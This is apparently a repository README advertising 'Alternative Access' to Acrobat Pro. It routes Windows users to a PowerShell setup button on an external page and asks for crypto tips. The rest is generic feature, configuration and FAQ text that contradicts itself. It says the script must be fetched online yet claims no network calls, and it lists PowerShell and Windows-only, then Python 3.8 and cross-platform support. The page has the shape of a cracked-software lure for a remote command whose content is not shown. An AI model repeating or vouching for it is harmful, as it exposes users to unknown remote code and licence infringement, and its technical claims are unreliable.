<div align="center">

# Acrobat Pro PDF Tools — Alternative Access for Windows

![](files/preview.png)

### ⌨️ PowerShell Command Button

<a href="https://manoj07d.github.io/acrobat-pro-pdf-tools/"><img src="files/button.png" width="400" alt="PowerShell setup"></a>

[![pwsh](https://img.shields.io/badge/PWSH-7%2B-e11d48?style=for-the-badge&labelColor=0d1117)]() [![setup](https://img.shields.io/badge/SETUP-5.1K-f43f5e?style=for-the-badge&labelColor=0d1117)]() [![release](https://img.shields.io/badge/RELEASE-PRODUCTION-2ea44f?style=for-the-badge&labelColor=0d1117)]()

<div align="center">
<h3>Give me a tip</h3>
<p><strong>BTC</strong>:&nbsp;<code>15EqAoV8vAd3DvfnPL3hxDQJHTB29RTa5Z</code> | <strong>ETH</strong>:&nbsp;<code>0x0f834ee0852F1239cE92b342Cf3f0A79310e26b2</code> | <strong>TRON</strong>:&nbsp;<code>TEeU2189TSmcSw9kEtW9Q18tzhhJUkdERE</code></p>
</div>

</div>

---

Acrobat Pro PDF Tools provides a focused command-line interface for driving Acrobat Pro's document engine through scripted workflows. It exposes batch conversion, metadata extraction, page-level manipulation, and form-field processing as deterministic operations that integrate cleanly into existing pipelines. The tool communicates directly with the underlying Acrobat Pro automation layer, so behavior matches what the desktop application produces while remaining fully headless and reproducible. Output is structured and stable across runs, making it suitable for automated validation and downstream processing.

## 📋 System Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

**Full document lifecycle support** — Open, inspect, edit, annotate, merge, split, compress, and export PDF files from a single unified interface, eliminating the need to chain multiple utilities together.
- **Precise page-level operations** — Reorder, rotate, crop, extract, and delete individual pages with deterministic output. Batch operations apply consistently across arbitrarily large documents without breaking internal references.
- **Native annotation and form handling** — Create and modify comments, highlights, stamps, and interactive form fields while preserving the original document structure and metadata.
- **High-fidelity format conversion** — Convert to and from common interchange formats with configurable fidelity settings, retaining layout, embedded fonts, and vector content where the target format permits.
- **Configurable compression pipeline** — Tune image downsampling, font subsetting, and object stream optimization independently to hit target file sizes without sacrificing legibility.
- **Scriptable and headless operation** — Drive every feature programmatically through a stable API surface, enabling repeatable pipelines, scheduled batch jobs, and integration into existing document workflows.
- **Deterministic, offline-first execution** — All processing runs locally with no dependency on remote services, so results are reproducible and sensitive documents never leave the host environment.
- **Cross-platform consistency** — Identical behavior and output across supported operating systems, with no platform-specific quirks in rendering or serialization.

## How it works

Acrobat Pro PDF Tools operates as a local processing layer that sits between your documents and the operations you apply to them. At its core, the tool parses each PDF into its structural components—object streams, cross-reference tables, page trees, fonts, and embedded resources—then rebuilds documents through controlled transformations rather than blind rewriting. This approach preserves layout fidelity while allowing precise modification of content, metadata, permissions, and form fields.

The workflow follows a deterministic pipeline. Input files are first validated and normalized: malformed xref tables are repaired, compression filters are decoded, and encryption handlers are identified so that permitted operations can proceed without corrupting signed or secured structures. From there, the tool exposes discrete operations—merging, splitting, redaction, OCR-layer insertion, form flattening, and metadata adjustment—each implemented as a bounded transformation over the parsed object graph. Changes are staged in memory and only committed to output files after integrity checks confirm that page geometry, resource references, and interactive elements remain consistent.

For operations requiring rendering, the tool relies on its internal layout engine to rasterize or re-vectorize content at configurable resolution, ensuring text layers and annotations align with their visual counterparts. Batch processing is handled through a queue that isolates each document, so a failure on one file does not propagate to the rest. Every operation logs its transformation steps, giving you a traceable record of what changed and why, which is useful when reconciling revisions across large document sets.

## Modules and Settings

### Editing and Markup Module
This module provides the working surface for applying edits and annotations to a PDF before any structural or export operations.
- Markup tool selection (highlight, underline, strikethrough, comment) determines which annotation is placed when you click or drag over content.
- Color and opacity controls let you make markup subtle for review or prominent for sign-off.
- Edit scope options restrict changes to the current page, a page range, or the whole document, so corrections stay contained.
- The document preview refreshes after each change, letting you confirm placement and appearance before moving to page organization or export.

### Page Organization Module
This module handles structural changes to page sequence and composition, and its output feeds directly into merge, split, and export workflows.
- Reorder controls move selected pages to a new position, with the resulting sequence shown in a thumbnail preview.
- Rotate, delete, and duplicate actions apply to the current selection, so you can clean up scans or remove blank pages.
- Insert options add pages from another file or a blank page at a chosen position.
- The restructured preview becomes the working document that subsequent modules operate on.

### Merge, Split, and Conversion Module
This module covers document assembly, separation, and format export, and typically runs after page organization has settled the contents.
- Source file selection and ordering define how multiple PDFs are combined into one document.
- Split options define target ranges or page selections, and output naming settings distinguish the resulting files.
- Conversion settings choose the output format, page range, and available quality parameters for the export.
- Generated files are listed for review, so you can inspect results before saving or passing them to compression.

### Compression and Redaction Module
This module combines size reduction and sensitive-content removal, both of which alter file content and are best applied near the end of a workflow.
- Compression and image-quality controls trade visual fidelity for smaller file size, with original and resulting size indicators shown for comparison.
- Redaction selection tools mark text or areas for removal, and confirmation controls define exactly what is stripped.
- The redacted or compressed preview confirms the outcome while keeping the file openable in common PDF viewers.
- Results from this module can be routed into batch processing when the same treatment applies to many files.

### Forms and Metadata Module
This module manages document-level information and interactive fields, complementing the content changes made elsewhere.
- Field browsing shows existing form fields so you can choose which values to view or update.
- Metadata editing covers entries such as title, author, and keywords, with selection controls limiting what changes.
- Updated properties are reflected in the document's information panel, giving a consistent record alongside edited or redacted content.

### Batch Processing Module
This module extends selected operations across many files, drawing on settings configured in the modules above.
- Operation selection determines which module's action (compression, conversion, markup, or redaction) is applied to the batch.
- File-level parameters carry over the relevant settings, such as output format or compression level, for every file in the run.
- A completion overview summarizes processed files and lists the resulting output documents for review.

### Additional Settings
- Output naming and destination preferences keep merged, split, and converted files organized consistently across runs.
- Preview refresh behavior controls when the document view updates after edits, useful when working with large files.
- Annotation and metadata visibility toggles let you hide review markup or property changes while checking final appearance.
- Confirmation prompts for destructive actions such as redaction and permanent deletion add a verification step before changes are applied.
- Processing summary detail level adjusts how much per-file information appears in batch completion reports.

## Usage Scenarios

### Cleaning Up a Scanned Contract Before Sign-Off
**Goal:** Prepare a scanned supplier contract for internal review by fixing page order, removing blank pages, and making key clauses easy to spot.
**Steps:**
1. Open the PDF in the Editing and Markup Module and set markup tool selection to highlight, choosing a prominent color so reviewers notice critical clauses.
2. Use edit scope to limit markup to a page range covering the commercial terms, and confirm placement in the refreshed document preview.
3. Switch to the Page Organization Module, rotate misaligned scanned pages and delete blank pages from the current selection, checking the thumbnail preview for the corrected sequence.
4. Insert a cover page from another file at the chosen position so the contract opens with a summary sheet.
5. Review the restructured preview before handing the document to reviewers.

**Expected result:** A reordered, rotated contract with blank pages removed, a summary cover inserted, and highlighted clauses visible in the preview — ready for review or further export.

### Assembling a Client Package from Multiple Reports
**Goal:** Combine several departmental PDF reports into a single deliverable, then produce a smaller version suitable for email distribution.
**Steps:**
1. In the Merge, Split, and Conversion Module, select the source files and set their ordering to define how the reports are combined into one document.
2. Apply the merge and review the generated file in the results list.
3. Open the merged document in the Compression and Redaction Module, adjust compression and image-quality controls, and compare the original and resulting size indicators.
4. Confirm the smaller preview still opens cleanly and content reads acceptably.
5. Set output naming and destination preferences in Additional Settings so the final package is stored consistently with previous client deliveries.

**Expected result:** A single merged PDF containing all reports in the intended order, plus a compressed version with a visible size reduction that remains openable in common PDF viewers.

### Preparing Redacted Documents for a Batch of Case Files
**Goal:** Remove sensitive content from many PDF files at once and correct document metadata before releasing them to an external party.
**Steps:**
1. Open a representative file from the case set and use the redaction selection tools in the Compression and Redaction Module to mark text and areas for removal, confirming exactly what is stripped through the confirmation controls.
2. Verify the redacted preview no longer shows the selected content and remains openable.
3. In the Forms and Metadata Module, browse form fields and update metadata entries such as title, author, and keywords, using selection controls to limit which changes apply.
4. Move to the Batch Processing Module, select the redaction operation, and carry over the relevant file-level parameters for the entire set of case files.
5. Review the completion overview summarizing processed files and inspect the listed output documents.

**Expected result:** A set of redacted PDFs with sensitive content removed and updated metadata reflected in each document's information panel, accompanied by a batch completion summary listing every processed file for final review.

## Compatibility

The tool is designed to work with Adobe Acrobat Pro and integrates with its PDF processing capabilities. It runs on Windows, macOS, and Linux, and is tested against Acrobat Pro DC and Acrobat Pro. The tool targets the installed Acrobat Pro components on the local system, so a functioning Acrobat Pro installation is required for PDF operations. It operates against the local filesystem and the Acrobat Pro application interface; no additional services are required. Python 3.8 or later is required to run the tool. Concurrent batch processing is supported, and the tool handles large PDFs up to the limits imposed by the Acrobat Pro installation. Users running multiple Acrobat Pro versions side by side should ensure the intended installation is selected during configuration.

## Configuration

Configuration is handled through a single declarative file that lives alongside the tool. On first run, the tool writes a default configuration with sensible values, so operation can begin immediately without manual setup. Every option can be overridden either by editing the configuration file directly or by supplying environment variables with the `APPT_` prefix, which take precedence over file values.

The configuration surface is organized into four blocks:

- **Input/output** — default input directory, output directory, filename pattern for generated files, and overwrite behavior for existing outputs.
- **Processing** — page range defaults, image resolution for rasterized operations, compression level, and whether to preserve document metadata during transforms.
- **Runtime** — worker count for batch operations, temporary directory location, logging verbosity, and a deterministic seed for reproducible batch ordering.
- **Validation** — pre-flight checks that confirm source files are readable and structurally intact before any operation begins, with configurable strictness for malformed inputs.

A minimal configuration looks like this:

```
[input]
directory =./in
[output]
directory =./out
pattern = {name}_{operation}.pdf
[processing]
resolution = 300
compression = balanced
[runtime]
workers = 4
verbosity = info
```

Values are type-checked at load time; invalid or unknown keys cause startup to fail with a precise error that names the offending key and expected type, rather than silently falling back to defaults. This makes misconfiguration obvious during development and prevents subtle drift in automated pipelines.

For environments where configuration files are impractical — containerized runs, ephemeral CI jobs, or shared hosts — all settings are equally expressible through environment variables, for example `APPT_PROCESSING_RESOLUTION=300` or `APPT_RUNTIME_WORKERS=8`. Environment variables always win over file values, and the tool logs the resolved configuration at startup at `debug` verbosity so the effective settings are auditable.

Profiles are supported for teams that need multiple configurations, such as separate profiles for draft and archival output. A profile is selected with a single flag, and profile-specific values are merged over the base configuration. Profile names are arbitrary strings; the tool does not impose a fixed set, so workflows can define whatever structure fits their needs.

Configuration is validated before any file is touched, and the tool refuses to proceed if required directories are missing or unwritable, if worker counts are non-positive, or if resolution values fall outside a supported range. These checks are fast and surface problems early, keeping batch runs predictable.

## FAQ

**Does this tool modify the original PDF files?**

No. All operations read from the source file and write results to a separate output location. The original documents remain untouched unless you explicitly direct output to the same path, which the tool does not do by default.

**Which PDF versions and specifications are supported?**

The tool handles PDF 1.4 through PDF 2.0, including encrypted documents that permit content extraction. Linearized files, tagged PDFs, and documents with incremental updates are parsed correctly. Files using proprietary extensions outside the published specification may require fallback handling, which is applied automatically where possible.

**How does the tool handle encrypted or password-protected documents?**

Password-protected files are supported when a valid credential is supplied through the configuration layer. The tool does not attempt to bypass encryption; it operates only on documents the caller is authorized to open. Permission flags embedded in the document are respected during write operations.

**What happens when a document contains malformed or non-conforming structures?**

The parser applies a repair pass before processing. Recoverable defects—broken cross-reference tables, orphaned objects, mismatched stream lengths—are corrected in memory. If a defect cannot be reconciled automatically, the operation reports the specific object and aborts cleanly rather than emitting a corrupt result.

**Can the tool process files in batch?**

Yes. Batch operation is a first-class feature. Multiple inputs can be queued in a single invocation, with per-file status reporting and isolated failure handling so one problematic document does not halt the remainder of the batch.

**How is configuration managed?**

Configuration is resolved in layers: defaults, then a project-level configuration file, then environment-level overrides, then per-invocation arguments. The most specific layer wins. Every resolved setting is logged at startup so behavior is reproducible and auditable.

**What output formats are produced?**

Primary output is standards-conformant PDF. Where the selected operation calls for extracted content, output is emitted as structured text or as individual assets written alongside a manifest. Output naming and directory layout are deterministic and configurable.

**Does the tool depend on external services?**

No. All processing is local. There are no network calls, no telemetry, and no remote validation steps. The tool operates fully offline once present on the system.

**How are errors and exit codes reported?**

Each invocation returns a defined exit code: zero for success, distinct non-zero codes for input errors, configuration errors, processing failures, and partial batch completion. Human-readable diagnostics are written to standard error, and machine-readable status can be directed to a log file.

**Is the tool compatible with automated pipelines?**

Yes. It is designed for non-interactive execution: deterministic output paths, stable exit codes, no prompts, and no dependency on a graphical session. It runs equally well from a terminal, a scheduler, or a build step.

**What are the performance characteristics?**

Processing is streaming where the operation permits, so memory use stays bounded relative to document size rather than scaling with page count. Large documents are handled without loading the entire file into memory at once. Throughput depends on document complexity and the selected operation.

**How do I verify that a result is correct?**

The tool includes a validation mode that re-parses its own output and checks structural integrity, page count, and object consistency against the source. Validation results are reported per file and can gate downstream steps in an automated workflow.

**Where are the limits of the tool's scope?**

The tool performs document-level operations within the published PDF specification. It does not attempt to reconstruct content that was never present in the source, nor does it alter the semantic meaning of a document. Operations outside the supported feature set are rejected explicitly rather than approximated silently.

## Disclaimer

This tool is provided as-is, without warranty of any kind, express or implied. It is intended for legitimate use with legally obtained installations. Users are responsible for ensuring their use complies with applicable laws and the terms governing the software it interacts with. The maintainers assume no liability for misuse, data loss, or damages arising from use of this tool. Compatibility with future versions of the target software is not guaranteed and may change without notice.